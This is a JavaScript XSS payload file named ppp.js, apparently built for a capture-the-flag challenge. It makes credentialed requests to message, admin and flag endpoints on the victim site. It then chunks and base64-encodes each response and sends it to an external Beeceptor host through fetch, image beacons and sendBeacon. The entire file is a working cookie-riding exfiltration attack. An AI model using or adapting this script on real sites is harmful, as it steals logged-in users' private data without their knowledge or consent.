// ppp.js - multi-endpoint probing + exfil to Beeceptor
// EXFIL_BASE is your Beeceptor endpoint (no trailing slash)
const EXFIL_BASE = "https://pepechicken.free.beeceptor.com";
const CHUNK = 900;

(function(){
  function b64u(s){ return btoa(unescape(encodeURIComponent(s))); }
  function sleep(ms){ return new Promise(r=>setTimeout(r, ms)); }
  async function fireNoCors(path){
    try { fetch(EXFIL_BASE + path, { mode: "no-cors", keepalive: true }); } catch(e){}
    try { (new Image()).src = EXFIL_BASE + path; } catch(e){}
  }
  async function sendBeacon(path, data){
    try {
      if (navigator.sendBeacon) {
        const blob = new Blob([data], {type:"application/octet-stream"});
        navigator.sendBeacon(EXFIL_BASE + path, blob);
      }
    } catch(e){}
  }

  async function exfilLabelled(name, text) {
    try {
      const meta = { from: location.pathname + location.search, endpoint: name, when: Date.now() };
      const payload = JSON.stringify({ meta: meta, body: text });
      const enc = b64u(payload);

      // header (number of chunks)
      const parts = [];
      for (let i=0;i<enc.length;i+=CHUNK) parts.push(enc.slice(i,i+CHUNK));
      const headerPath = "/_h/" + encodeURIComponent(name) + "/" + parts.length;
      await fireNoCors(headerPath);
      await sendBeacon(headerPath, "hdr");

      for (let i=0;i<parts.length;i++){
        const p = "/" + encodeURIComponent(name) + "/" + i + "/" + encodeURIComponent(parts[i]);
        await fireNoCors(p);
        await sendBeacon("/beacon/" + encodeURIComponent(name) + "/" + i, parts[i]);
        await sleep(120);
      }
    } catch (e) {
      try { await fireNoCors("/_err/" + encodeURIComponent(name) + "/" + encodeURIComponent(String(e))); } catch(e2){}
    }
  }

  async function probe() {
    // Candidate endpoints to try in order. Add or remove items as you like.
    const endpoints = [
      { name: "messages?id=1", fn: () => fetch("/messages?id=1", { method: "GET", credentials: "include" }) },
      { name: "messages", fn: () => fetch("/messages", { method: "GET", credentials: "include" }) },
      { name: "messages?id=0", fn: () => fetch("/messages?id=0", { method: "GET", credentials: "include" }) },
      { name: "messages?id=admin", fn: () => fetch("/messages?id=admin", { method: "GET", credentials: "include" }) },
      { name: "messages_all_post", fn: () => fetch("/messages", { method: "POST", credentials: "include",
            headers: {"Content-Type":"application/json"}, body: JSON.stringify({all:true}) }) },
      { name: "messages_post_id1", fn: () => fetch("/messages", { method: "POST", credentials: "include",
            headers: {"Content-Type":"application/json"}, body: JSON.stringify({id:1}) }) },
      { name: "flag", fn: () => fetch("/flag", { method: "GET", credentials: "include" }) },
      { name: "admin_flag", fn: () => fetch("/admin/flag", { method: "GET", credentials: "include" }) },
      { name: "admin_messages", fn: () => fetch("/admin/messages", { method: "GET", credentials: "include" }) },
      { name: "messages_all", fn: () => fetch("/messages/all", { method: "GET", credentials: "include" }) }
    ];

    for (let i=0;i<endpoints.length;i++){
      const e = endpoints[i];
      try {
        let resp = await e.fn().catch(()=>null);
        if(!resp || (resp.status && resp.status>=400)) {
          // still send an exfil that indicates failure to fetch (use response status/text if present)
          const errText = resp ? ("HTTP " + resp.status) : "no-response";
          await exfilLabelled(e.name, "[fetch-error] " + errText);
          continue;
        }
        let text = "";
        try { text = await resp.text(); } catch(e) { text = "[text-read-error]"; }
        // some endpoints will return JSON; keep raw text
        if (text && text.length > 0) {
          await exfilLabelled(e.name, text);
        } else {
          await exfilLabelled(e.name, "[empty-response]");
        }
      } catch(err) {
        await exfilLabelled(e.name, "[exception] " + String(err));
      }
      // small wait between probes
      await sleep(300);
    } // end for endpoints
  } // end probe()

  try { probe(); } catch(e) {}
})();
